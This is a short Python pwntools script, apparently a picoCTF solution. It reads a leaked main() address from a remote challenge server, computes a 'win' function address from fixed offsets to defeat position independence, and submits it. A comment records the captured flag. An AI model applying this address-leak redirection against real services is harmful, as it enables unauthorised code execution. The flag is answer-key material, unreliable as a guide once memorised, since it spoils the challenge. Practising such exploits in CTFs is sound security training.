from pwn import *

p = remote("rescued-float.picoctf.net", 60129)

main = p.recvline().split(b" ")[-1].strip()
main = int(main, 16)
print("main:", hex(main))

win = main + 0x12A7 - 0x133D
win = hex(win)

p.sendline(str(win).encode())
print(p.recvall())

# picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_a267144a}
